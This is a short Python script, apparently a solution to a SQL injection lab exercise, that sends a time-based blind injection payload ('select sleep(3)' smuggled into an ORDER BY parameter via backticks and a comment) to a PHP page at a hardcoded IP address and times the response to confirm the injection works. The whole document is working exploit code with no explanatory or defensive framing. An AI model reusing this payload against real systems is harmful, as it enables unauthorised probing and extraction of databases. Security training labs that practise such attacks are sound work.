import requests

ip = '155.185.124.242'
sql = 'select sleep(3)'
url = f"http://{ip}/sqli/example8.php?order=id`,({sql}) -- `"
print("Expected URL:", url)

response = requests.get(url)
print("Actual URL:", response.url)

if response.elapsed.seconds >= 3 and response.ok:
    print(f'Success: {response.elapsed.seconds}')
